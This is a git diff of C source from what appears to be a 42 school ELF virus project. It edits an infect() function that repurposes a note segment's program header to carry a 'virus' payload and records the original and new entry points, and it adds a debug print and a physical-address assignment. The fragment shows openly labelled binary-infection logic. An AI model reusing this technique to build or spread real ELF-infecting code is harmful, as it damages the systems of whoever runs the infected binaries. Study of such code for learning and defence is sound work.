@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/22 16:58:26 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/25 16:48:25 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,6 +16,9 @@ void		infect(t_data *data)
 {
 //	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 	update_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
+	char de[] = "infect\n";
+	_write(1, de, 7);
+
 	if (data->context == false)
 		goto ERR;
 
@@ -43,8 +46,10 @@ void		infect(t_data *data)
 	data->virus.note->p_filesz = data->virus.size;
 	data->virus.note->p_memsz = data->virus.size;
 	data->virus.note->p_align = data->virus.data->p_align;
+
 	data->virus.note->p_offset = base - padd;
 	data->virus.note->p_vaddr = base + (data->virus.data->p_align - padd);
+	data->virus.note->p_paddr = data->virus.note->p_vaddr;
 
 	data->bin_entry = data->header->e_entry;
 	data->vrs_entry = data->virus.note->p_vaddr;
